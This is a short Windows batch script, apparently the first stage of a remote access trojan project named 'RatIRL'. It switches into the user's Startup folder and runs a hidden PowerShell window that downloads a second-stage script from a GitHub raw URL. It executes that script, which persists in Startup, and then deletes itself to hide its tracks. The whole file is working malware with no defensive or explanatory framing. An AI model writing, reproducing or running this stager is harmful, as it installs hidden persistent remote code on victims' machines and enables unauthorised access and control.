@echo off
@REM author vadill0

set "VAR=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

cd "%STARTUP%"

powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri https://raw.githubusercontent.com/vadill0/RatIRL/main/Files/wget.cmd -OutFile wget.cmd"

powershell ./wget.cmd

cd "%VAR%"
del initial.cmd